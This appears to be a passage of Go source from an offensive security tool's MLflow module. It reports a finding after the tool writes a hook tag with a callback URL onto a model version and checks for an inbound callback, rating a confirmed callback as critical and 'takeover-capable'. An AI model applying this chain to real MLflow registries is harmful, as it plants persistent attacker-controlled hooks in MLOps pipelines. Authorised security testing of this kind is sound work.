	description := fmt.Sprintf("Wrote tag %s on MLflow model version %s v%s with callback URL %s. Registry metadata influence is confirmed; no downstream hook delivery was observed within %s.",
		safeLabel(result.TagKey), safeLabel(result.Model), safeLabel(result.Version), safeLabel(submittedCallbackURL), oobConfirmWait)
	hookSignal := "tag-written"
	if callbackConfirmed {
		severity = report.SeverityCritical
		stage = "own"
		landed = "takeover-capable"
		title = fmt.Sprintf("MLflow registry hook delivered by controller: %s v%s", safeLabel(result.Model), safeLabel(result.Version))
		description = fmt.Sprintf("Wrote tag %s on MLflow model version %s v%s and observed a nonce-matched inbound callback from downstream hook automation. This proves registry metadata can drive persistent MLOps hook delivery; it is not arbitrary code execution on the MLflow server.",
			safeLabel(result.TagKey), safeLabel(result.Model), safeLabel(result.Version))
		hookSignal = "callback-confirmed"
	}

	metadata := map[string]interface{}{
		"module":                 "mlflow",
		"action":                 "hook",
		"mutating":               true,
		"provider":               "mlflow",
		"model":                  result.Model,
		"version":                result.Version,
		"model_stage":            result.Stage,
		"source":                 result.Source,
		"run_id":                 result.RunID,
		"tag_key":                result.TagKey,
		"hook_url":               result.HookURL,
		"callback_url":           cfg.CallbackURL,
		"submitted_callback_url": submittedCallbackURL,
		"prior_hook_url":         result.PriorValue,
		"verified":               result.Verified,
		"callback_confirmed":     callbackConfirmed,
		"hook_signal":            hookSignal,
	}
	if callbackConfirmed {
		metadata["callback_remote_addr"] = hit.RemoteAddr
		metadata["callback_body"] = hit.Body
	}

	finding := newExploitFinding(
		report.SourceMLflow,
		mlflowTarget,
		title,
		severity,
		description,
		metadata,
	)
	finding.Evidence = fmt.Sprintf("Chain:    POST /model-versions/set-tag -> GET /model-versions/get\nModel: %s\nVersion: %s\nTag: %s=%s\nVerified: %t\nSignal: %s",
		result.Model, result.Version, result.TagKey, result.HookURL, result.Verified, hookSignal)
	if callbackConfirmed {
		finding.Evidence += fmt.Sprintf("\ncallback_remote_addr=%s\ncallback_body=%s", hit.RemoteAddr, hit.Body)
	}
	finding.Metadata = applyStageLanded(finding.Metadata, stage, landed, "mlflow-hook", "model-version-tag")
	plan := buildMLflowHookWorkflowPlan(mlflowTarget, result.Model, result.Version, stage, landed)
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)

	infof("MLflow hook metadata installed: model=%s version=%s tag=%s callback_confirmed=%t", result.Model, result.Version, result.TagKey, callbackConfirmed)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "mlflow",
		Action:              "hook",
		ResourcesEnumerated: 1,
		Mutating:            true,
		WorkflowPlans:       []workflowPlan{plan},
	})
}
